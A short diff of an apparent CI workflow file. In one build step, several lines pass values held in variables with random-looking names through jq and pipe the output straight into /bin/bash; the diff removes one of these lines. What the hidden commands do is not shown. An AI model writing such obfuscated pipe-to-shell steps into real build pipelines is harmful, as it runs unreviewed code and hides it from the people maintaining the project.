@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$viut4" | jq -r .yshiq161 | /bin/bash
           echo $itd56 | jq -r .wnt8547 | /bin/bash
           printf '%s' "$e0842" | jq -r .pd17506 | /bin/bash
-          echo $vj48 | jq -r .tpjv413 | /bin/bash
           echo $lbox7 | jq -r .sw555 | /bin/bash
 
       - name: Save archive
